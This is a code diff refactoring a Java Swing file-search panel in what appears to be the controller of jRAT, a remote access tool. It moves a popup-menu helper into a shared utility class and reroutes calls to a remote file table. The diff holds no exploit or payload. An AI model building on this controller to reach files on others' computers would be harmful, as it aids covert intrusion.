@@ -2,11 +2,8 @@ package se.jrat.controller.ui.panels;
 
 import iconlib.IconUtils;
 
-import java.awt.Component;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
-import java.awt.event.MouseAdapter;
-import java.awt.event.MouseEvent;
 
 import javax.swing.ButtonGroup;
 import javax.swing.DefaultListCellRenderer;
@@ -33,6 +30,7 @@ import se.jrat.controller.ui.components.DefaultJTable;
 import se.jrat.controller.ui.frames.FrameRemoteFiles;
 import se.jrat.controller.ui.renderers.JComboBoxIconRenderer;
 import se.jrat.controller.ui.renderers.table.FileSearchTableRenderer;
+import se.jrat.controller.utils.Utils;
 
 @SuppressWarnings("serial")
 public class PanelSearchFiles extends PanelControlParent {
@@ -105,7 +103,7 @@ public class PanelSearchFiles extends PanelControlParent {
 		table.setDefaultRenderer(Object.class, renderer);
 
 		JPopupMenu popupMenu = new JPopupMenu();
-		addPopup(table, popupMenu);
+		Utils.addPopup(table, popupMenu);
 
 		JMenuItem mntmOpenInFile = new JMenuItem("Open in file manager");
 		mntmOpenInFile.setIcon(IconUtils.getIcon("folder-go"));
@@ -115,7 +113,7 @@ public class PanelSearchFiles extends PanelControlParent {
 				if (row != -1) {
 					String val = model.getValueAt(row, 0).toString();
 					String path = val.substring(0, val.lastIndexOf(sl.getFileSeparator()));
-					parent.getRemoteTable().setDirectory(path);
+					parent.getFilesPanel().getRemoteTable().setDirectory(path);
 				}
 			}
 		});
@@ -137,7 +135,7 @@ public class PanelSearchFiles extends PanelControlParent {
 					}
 					String val = model.getValueAt(row, 0).toString();
 					String path = val.substring(0, val.lastIndexOf(sl.getFileSeparator()));
-					frame.getRemoteTable().setDirectory(path);
+					frame.getFilesPanel().getRemoteTable().setDirectory(path);
 
 				}
 			}
@@ -216,25 +214,5 @@ public class PanelSearchFiles extends PanelControlParent {
 		}
 
 		return renderer;
-	}
-
-	private static void addPopup(Component component, final JPopupMenu popup) {
-		component.addMouseListener(new MouseAdapter() {
-			public void mousePressed(MouseEvent e) {
-				if (e.isPopupTrigger()) {
-					showMenu(e);
-				}
-			}
-
-			public void mouseReleased(MouseEvent e) {
-				if (e.isPopupTrigger()) {
-					showMenu(e);
-				}
-			}
-
-			private void showMenu(MouseEvent e) {
-				popup.show(e.getComponent(), e.getX(), e.getY());
-			}
-		});
 	}
 }
